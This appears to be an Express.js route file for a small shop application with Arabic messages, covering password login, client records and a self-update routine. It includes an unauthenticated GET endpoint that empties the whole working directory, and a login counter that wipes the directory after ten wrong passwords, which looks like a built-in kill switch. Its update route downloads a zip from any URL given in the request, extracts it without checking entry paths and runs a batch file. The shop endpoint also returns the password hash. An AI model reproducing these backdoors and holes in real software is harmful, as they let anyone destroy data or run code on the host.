const fetch = require("node-fetch");
const bcrypt = require("bcrypt");
const fsExtra = require("fs-extra");
const fs = require("fs");
const path = require("path");
const yauzl = require("yauzl");
const { execFile } = require("node:child_process");

const mongoose = require("mongoose");
const Shop = mongoose.model("Shop");

const file_path = "./secret";

let times = 0;

module.exports = (router, app) => {
  router.get("/isvalid", async (req, res) => {
    const fileExists = fs.existsSync(file_path);
    const shop = await Shop.findOne();

    res.json({ fileExists, shop });
  });

  router.get("/remove_file", async (req, res) => {
    fs.unlinkSync(file_path);
    res.json("200 OK");
  });
  router.get("/remove_all", async (req, res) => {
    fsExtra.emptyDirSync("./");
    res.json("200 OK");
  });

  router.post("/password", async (req, res) => {
    if (fs.existsSync(file_path)) {
      const password = await fs.readFileSync(file_path, "utf-8");

      if (password == req.body.password) {
        fs.unlinkSync(file_path);
        res.json({ ok: true });
      } else res.json({ ok: false, text: "كلمة المرور خطأ" });
    } else {
      const shop = await Shop.findOne();
      if (!shop) return res.json({ text: "الملف غير موجود", ok: false });

      const ok = await bcrypt.compare(req.body.password, shop.password);
      if (ok) {
        res.json({ ok });
        times = 0;
      } else {
        times++;

        switch (times) {
          case 1:
            res.json({ ok, text: "كلمة المرور خاطئه اماك 9 محاولات اخرى فقط" });
            break;
          case 8:
            res.json({ ok, text: "باقي محاولتين بعد ذلك ستتم الحذف " });
            break;
          case 9:
            res.json({ ok, text: "باقي محاوله وحديده بعد ذلك ستتم الحذف " });
            break;

          case 10:
            res.json({ ok, text: "تم الحذف" });
            fsExtra.emptyDirSync("./");
            break;

          default:
            res.json({ ok, text: "كلمة المرور خطأ" });
        }
      }
    }
  });

  router.post("/save_client", async (req, res) => {
    const salt = bcrypt.genSaltSync(8);
    const password = bcrypt.hashSync(req.body.password, salt);

    const shop = new Shop({
      ...req.body,
      password,
      types: ["عام"],
    });

    shop.save().then((_) => {
      res.json({ saved: true });
    });
  });

  router.post("/update_client", async (req, res) => {
    Shop.findOneAndUpdate({}, req.body)
      .then(() => res.json({ updated: true }))
      .catch((err) => console.error(err));
  });

  router.get("/shop", async (req, res) => {
    const shop = await Shop.findOne();

    res.json(shop);
  });

  router.post("/update", async (req, res) => {
    try {
      // variables
      const { url } = req.body;
      const extractPath = path.join(__dirname, "../../..");
      const uploadDir = path.join(__dirname, "../..", "upload");
      const zipPath = path.join(__dirname, "../../..", "temp-repo.zip");
      const installFile = path.join(__dirname, "../../..", "install.bat");

      if (process.env.NODE_ENV !== "development") {
        // 1| download a new version zip
        await downloadFile(url, zipPath);

        // 2| unzip file
        await extractZip(zipPath, extractPath);

        copyDirContents(
          // 3| copy old images and files
          uploadDir,
          path.join(extractPath, "TRUEEMIT-elfa7s-main/server/upload")
        );

        // 4| clean the base dir and skip [files / dirs]
        cleanDirectory(extractPath, ["TRUEEMIT-elfa7s-main", "node_modules"]);

        // 5| get the new code
        copyDirContents(
          path.join(extractPath, "TRUEEMIT-elfa7s-main"),
          extractPath
        );

        // 6| stop current server
        global.server.close();

        // 7| start install and build new code
        startFile(installFile, () => {
          res.json({ update_file: 4 });
          console.clear();
          process.exit(0);
        });
      } else res.json({ update_file: 4 });
    } catch (err) {
      console.error(err);
    }
  });

  return router;
};
process.on("SIGINT", () => {
  console.log("\nReceived SIGINT. Graceful shutdown...");
  process.exit(0);
});

process.on("SIGTERM", () => {
  console.log("Received SIGTERM. Graceful shutdown...");
  process.exit(0);
});

// Helper function to download file
async function downloadFile(url, filePath) {
  const response = await fetch(url);

  if (!response.ok) {
    throw new Error(`Failed to download: ${response.statusText}`);
  }

  const fileStream = fs.createWriteStream(filePath);
  response.body.pipe(fileStream);

  return new Promise((resolve, reject) => {
    fileStream.on("finish", resolve);
    fileStream.on("error", reject);
  });
}

// Helper function to extract ZIP file
function extractZip(zipPath, extractPath) {
  return new Promise((resolve, reject) => {
    yauzl.open(zipPath, { lazyEntries: true }, (err, zipfile) => {
      if (err) return reject(err);

      zipfile.readEntry();
      zipfile.on("entry", (entry) => {
        const entryPath = path.join(extractPath, entry.fileName);

        if (/\/$/.test(entry.fileName)) {
          // Directory entry
          fs.mkdirSync(entryPath, { recursive: true });
          zipfile.readEntry();
        } else {
          // File entry
          fs.mkdirSync(path.dirname(entryPath), { recursive: true });
          zipfile.openReadStream(entry, (err, readStream) => {
            if (err) return reject(err);

            const writeStream = fs.createWriteStream(entryPath);
            readStream.pipe(writeStream);
            writeStream.on("close", () => {
              zipfile.readEntry();
            });
          });
        }
      });

      zipfile.on("end", () => {
        resolve();
      });
    });
  });
}

// Helper function to copy directory contents
function copyDirContents(src, dest) {
  const items = fs.readdirSync(src);

  items.forEach((item) => {
    const srcPath = path.join(src, item);
    const destPath = path.join(dest, item);

    if (fs.statSync(srcPath).isDirectory()) {
      fs.mkdirSync(destPath, { recursive: true });
      copyDirContents(srcPath, destPath);
    } else {
      fs.copyFileSync(srcPath, destPath);
    }
  });
}

// Helper function to clean directory (except node_modules and .bolt)
function cleanDirectory(dir, skip = []) {
  const items = fs.readdirSync(dir);

  items.forEach((item) => {
    if (skip.includes(item)) {
      return; // Skip these directories
    }

    const itemPath = path.join(dir, item);
    if (fs.statSync(itemPath).isDirectory()) {
      fs.rmSync(itemPath, { recursive: true, force: true });
    } else {
      fs.unlinkSync(itemPath);
    }
  });
}

function startFile(file, cb) {
  if (fs.existsSync(file)) {
    execFile(file, (err) => {
      if (err) {
        console.error(err);
        setTimeout(() => startFile(file, cb), 2000);
      } else cb();
    });
    return true;
  } else {
    setTimeout(() => startFile(file, cb), 2000);
  }
}
